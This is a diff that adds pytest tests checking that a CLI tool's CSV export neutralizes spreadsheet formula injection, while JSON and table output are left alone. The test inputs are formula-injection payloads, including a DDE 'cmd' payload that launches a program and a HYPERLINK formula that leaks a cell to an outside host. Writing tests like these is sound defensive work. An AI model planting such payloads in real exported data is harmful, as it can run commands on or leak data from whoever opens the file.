@@ -12,6 +12,7 @@
 # See the License for the specific language governing permissions and
 # limitations under the License.
 
+import csv
 import io
 import json
 import logging
@@ -1305,6 +1306,83 @@ def test_stderr_hint_tty_only_once(capsys, monkeypatch, caplog):
     _run()
     tty = capsys.readouterr()
     assert tty.err.count(ascii_table.LARGE_RESULT_HINT) == 1
+
+
+def _read_csv(text: str) -> list[list[str]]:
+    # newline="" keeps a carriage return inside a quoted field intact.
+    return list(csv.reader(io.StringIO(text, newline="")))
+
+
+@pytest.mark.parametrize(
+    ("payload", "cell"),
+    [
+        ("=cmd|'/c calc'!A1", "'=cmd|'/c calc'!A1"),
+        ("+1+cmd|'/c calc'!A0", "'+1+cmd|'/c calc'!A0"),
+        ("-2+3", "'-2+3"),
+        ("@SUM(1+1)", "'@SUM(1+1)"),
+        ("\t=1+1", "'\t=1+1"),
+        ("\r=1+1", "'\r=1+1"),
+        ("\x1b[0m=1+1", "'=1+1"),
+        ('=1+2";=1+2', "'=1+2\";=1+2"),
+    ],
+)
+def test_csv_neutralizes_formula_cells(capsys, mock_cursor, payload, cell):
+    print_result(
+        QueryResult(mock_cursor(columns=["name"], rows=[(payload,)])),
+        output_format=OutputFormat.CSV,
+    )
+    output = get_output(capsys)
+    assert _read_csv(output) == [["name"], [cell]]
+    # Python 3.10 leaves a bare CR unquoted; the written field must be quoted.
+    if "\r" in cell:
+        assert output == 'name\n"\'\r=1+1"\n'
+
+
+def test_csv_neutralizes_formula_headers(capsys, mock_cursor):
+    print_result(
+        QueryResult(mock_cursor(columns=['=HYPERLINK("http://x/"&A2)'], rows=[(1,)])),
+        output_format=OutputFormat.CSV,
+    )
+    header = next(csv.reader(io.StringIO(get_output(capsys))))
+    assert header == ['\'=HYPERLINK("http://x/"&A2)']
+
+
+def test_csv_neutralizes_object_and_message_results(capsys):
+    print_result(ObjectResult({"=k": "=v"}), output_format=OutputFormat.CSV)
+    assert get_output(capsys) == "'=k\n'=v\n"
+
+    print_result(MessageResult("=1+1"), output_format=OutputFormat.CSV)
+    assert get_output(capsys) == "message\n'=1+1\n"
+
+
+def test_csv_keeps_numbers_and_plain_text(capsys):
+    print_result(
+        CollectionResult(
+            [
+                {
+                    "n": -5,
+                    "d": Decimal("-1.5"),
+                    "f": -0.5,
+                    "s": "a-b",
+                    "e": "",
+                    "t": "-5",
+                }
+            ]
+        ),
+        output_format=OutputFormat.CSV,
+    )
+    assert get_output(capsys) == "n,d,f,s,e,t\n-5,-1.5,-0.5,a-b,,'-5\n"
+
+
+def test_json_and_table_do_not_prefix_formulas(capsys):
+    row = {"name": "=1+1"}
+    print_result(CollectionResult([row]), output_format=OutputFormat.JSON)
+    assert get_output_as_json(capsys) == [row]
+
+    print_result(CollectionResult([row]), output_format=OutputFormat.TABLE)
+    table = get_output(capsys)
+    assert "=1+1" in table
+    assert "'=1+1" not in table
 
 
 def test_print_raw_strips_ansi_and_tees_spool(capsys, tmp_path):
